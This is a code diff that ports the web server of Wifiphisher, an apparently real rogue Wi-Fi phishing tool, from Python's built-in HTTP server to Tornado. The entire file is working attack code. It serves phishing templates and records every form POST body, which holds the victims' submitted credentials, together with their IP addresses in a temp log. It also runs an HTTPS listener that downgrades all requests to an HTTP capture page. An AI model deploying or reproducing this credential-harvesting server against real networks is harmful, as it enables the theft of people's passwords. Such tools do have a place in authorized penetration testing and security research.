@@ -1,179 +1,86 @@
-import SimpleHTTPServer
-import BaseHTTPServer
-import httplib
-import SocketServer
-import ssl
-import socket
-import cgi
-import os
+import tornado.ioloop
+import tornado.web
+import logging
+hn = logging.NullHandler()
+hn.setLevel(logging.DEBUG)
+logging.getLogger('tornado.access').disabled = True
+logging.getLogger('tornado.general').disabled = True
 from constants import *
 
 template = False
 terminate = False
 
-class SecureHTTPServer(BaseHTTPServer.HTTPServer):
-    """
-    Simple HTTP server that extends the SimpleHTTPServer standard
-    module to support the SSL protocol.
 
-    Only the server is authenticated while the client remains
-    unauthenticated (i.e. the server will not request a client
-    certificate).
+class DowngradeToHTTP(tornado.web.RequestHandler):
 
-    It also reacts to self.stop flag.
-    """
-    def __init__(self, server_address, HandlerClass):
-        SocketServer.BaseServer.__init__(self, server_address, HandlerClass)
-        self.socket = ssl.SSLSocket(
-            socket.socket(self.address_family, self.socket_type),
-            keyfile=PEM,
-            certfile=PEM
-        )
-
-        self.server_bind()
-        self.server_activate()
-
-    def serve_forever(self):
-        """
-        Handles one request at a time until stopped.
-        """
-        self.stop = False
-        while not self.stop:
-            self.handle_request()
+    def get(self, url):
+        self.redirect("http://10.0.0.1:8080/")
 
 
-class SecureHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
-    """
-    Request handler for the HTTPS server. It responds to
-    everything with a 301 redirection to the HTTP server.
-    """
-    def do_QUIT(self):
-        """
-        Sends a 200 OK response, and sets server.stop to True
-        """
-        self.send_response(200)
-        self.end_headers()
-        self.server.stop = True
+class ShowPhishingPageHandler(tornado.web.RequestHandler):
 
-    def setup(self):
-        self.connection = self.request
-        self.rfile = socket._fileobject(self.request, "rb", self.rbufsize)
-        self.wfile = socket._fileobject(self.request, "wb", self.wbufsize)
-
-    def do_GET(self):
-        self.send_response(301)
-        self.send_header('Location', 'http://' + NETWORK_GW_IP + ':' + str(PORT))
-        self.end_headers()
-
-    def log_message(self, format, *args):
-        return
+    def get(self, url):
+        try:
+            if "/" in url:
+                self.redirect("/index")
+            self.render("index.html", **template.get_context())
+            wifi_webserver_tmp = "/tmp/wifiphisher-webserver.tmp"
+            with open(wifi_webserver_tmp, "a+") as log_file:
+                log_file.write('[' + T + '*' + W + '] ' + O + "GET " + T +
+                               self.request.remote_ip + W + "\n"
+                               )
+                log_file.close()
+        # Ignore weird requests
+        except:
+            pass
 
 
-class HTTPServer(BaseHTTPServer.HTTPServer):
-    """
-    HTTP server that reacts to self.stop flag.
-    """
+class ReceiveCredsHandler(tornado.web.RequestHandler):
 
-    def serve_forever(self):
-        """
-        Handle one request at a time until stopped.
-        """
-        self.stop = False
-        while not self.stop:
-            self.handle_request()
-
-
-class HTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
-    """
-    Request handler for the HTTP server that logs POST requests.
-    """
-    def redirect(self, page="/"):
-        self.send_response(301)
-        self.send_header('Location', page)
-        self.end_headers()
-
-    def do_QUIT(self):
-        """
-        Sends a 200 OK response, and sets server.stop to True
-        """
-        self.send_response(200)
-        self.end_headers()
-        self.server.stop = True
-
-    def do_GET(self):
-        global template
-
-        # Two slashes in the URL will confuse our server
-        if self.path.split('.')[-1].count("/") > 0:
-            self.redirect("/index.html")
-
-        template_path = template.get_path()
+    def post(self):
+        self.redirect("/loading")
         wifi_webserver_tmp = "/tmp/wifiphisher-webserver.tmp"
         with open(wifi_webserver_tmp, "a+") as log_file:
-            log_file.write('[' + T + '*' + W + '] ' + O + "GET " + T +
-                           self.client_address[0] + W + "\n"
+            log_file.write('[' + T + '*' + W + '] ' + O + "POST " +
+                           T + self.request.remote_ip + " " +
+                           R + repr(self.request.body) +
+                           W + "\n"
                            )
             log_file.close()
-        if not os.path.isfile("%s/%s" % (template_path, self.path)):
-            self.path = "index.html"
-
-        if self.path.endswith(".html"):
-            self.send_response(200)
-            self.send_header('Content-type', 'text-html')
-            self.end_headers()
-            # Send file content to client
-            self.wfile.write(template.render(self.path).encode('utf-8'))
-            return
-        # Leave binary and other data to default handler.
-        else:
-            os.chdir(template_path)
-            SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self)
-
-    def do_POST(self):
         global terminate
-        redirect = False
-        form = cgi.FieldStorage(
-            fp=self.rfile,
-            headers=self.headers,
-            environ={'REQUEST_METHOD': 'POST',
-                     'CONTENT_TYPE': self.headers['Content-type'],
-                     })
-        if not form.list:
-            return
-        for item in form.list:
-            if item.name and item.value and POST_VALUE_PREFIX in item.name:
-                redirect = True
-                wifi_webserver_tmp = "/tmp/wifiphisher-webserver.tmp"
-                with open(wifi_webserver_tmp, "a+") as log_file:
-                    log_file.write('[' + T + '*' + W + '] ' + O + "POST " +
-                                   T + self.client_address[0] +
-                                   R + " " + item.name + "=" + item.value +
-                                   W + "\n"
-                                   )
-                    log_file.close()
-        if redirect:
-            self.redirect("/upgrading.html")
-            terminate = True
-            return
-        self.redirect()
-
-    def log_message(self, format, *args):
-        return
+        terminate = True
 
 
-def stop_server(port=PORT, ssl_port=SSL_PORT):
-    """
-    Sends QUIT request to HTTP server running on localhost:<port>
-    """
-    conn = httplib.HTTPConnection("localhost:%d" % port)
-    conn.request("QUIT", "/")
-    conn.getresponse()
+class ShowLoadingPageHandler(tornado.web.RequestHandler):
 
-    conn = httplib.HTTPSConnection("localhost:%d" % ssl_port)
-    conn.request("QUIT", "/")
-    conn.getresponse()
+    def get(self):
+        self.render("loading.html", **template.get_context())
 
 
-def serve_template(t):
+def runHTTPServer(ip, port, ssl_port, t):
     global template
     template = t
+    app = tornado.web.Application(
+        [
+            (r"/post", ReceiveCredsHandler),
+            (r"/loading", ShowLoadingPageHandler),
+            (r"/(.*)", ShowPhishingPageHandler)
+        ],
+        template_path=template.get_path(),
+        static_path=template.get_path_static(),
+        compiled_template_cache=False
+    )
+    app.listen(port, address=ip)
+
+    ssl_app = tornado.web.Application(
+        [
+            (r"/(.*)", DowngradeToHTTP)
+        ]
+    )
+    https_server = tornado.httpserver.HTTPServer(ssl_app, ssl_options={
+        "certfile": PEM,
+        "keyfile": PEM,
+    })
+    https_server.listen(ssl_port, address=ip)
+
+    tornado.ioloop.IOLoop.instance().start()
